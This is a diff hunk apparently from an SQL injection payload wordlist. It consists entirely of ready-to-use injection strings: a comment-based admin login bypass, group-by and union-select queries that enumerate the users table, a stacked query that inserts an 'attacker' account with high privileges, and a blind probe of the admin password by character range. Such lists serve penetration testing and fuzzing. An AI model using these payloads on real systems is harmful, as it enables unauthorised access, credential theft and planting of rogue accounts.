@@ -5,5 +5,5 @@ admin'--
 ' group by users.id, users.username, users.password, users.privs having 1=1-- 
 ' union select sum(username) from users-- 
 ' union select sum(id) from users-- 
-'; insert into users values( 666, 'attacker', 'foobar', 0xffff)-- 
+'; insert into users values( 666, 'attacker', 'foobar', 0, 'aa')-- 
 'union select * from users where username='admin' and password >='h' and password<'i'--
